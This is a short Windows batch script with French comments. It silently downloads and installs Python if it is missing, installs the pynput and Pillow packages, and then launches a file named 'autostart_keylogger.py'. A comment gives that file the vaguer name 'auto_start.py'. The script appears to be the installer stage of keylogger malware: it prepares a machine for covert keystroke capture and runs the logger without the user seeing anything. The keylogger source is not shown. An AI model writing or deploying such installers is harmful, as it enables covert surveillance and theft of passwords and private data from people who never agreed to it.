@echo off
:: Définir un chemin temporaire pour l'installateur
setlocal
set PYTHON_EXE="C:\Program Files\Python310\python.exe"

:: Vérifier si Python est déjà installé
if not exist %PYTHON_EXE% (
    echo [*] Python non détecté. Installation en cours...
    
    :: Télécharger Python via curl
    curl -o python_installer.exe https://www.python.org/ftp/python/3.10.11/python-3.10.11-amd64.exe

    :: Installer Python
    start /wait python_installer.exe /quiet InstallAllUsers=1 PrependPath=1
    del python_installer.exe
    echo [*] Python installé avec succès.
)

:: Installer les modules Python nécessaires
%PYTHON_EXE% -m ensurepip
%PYTHON_EXE% -m pip install --upgrade pip
%PYTHON_EXE% -m pip install pynput Pillow

:: Lancer auto_start.py
%PYTHON_EXE% autostart_keylogger.py

echo [*] Installation terminée.
exit
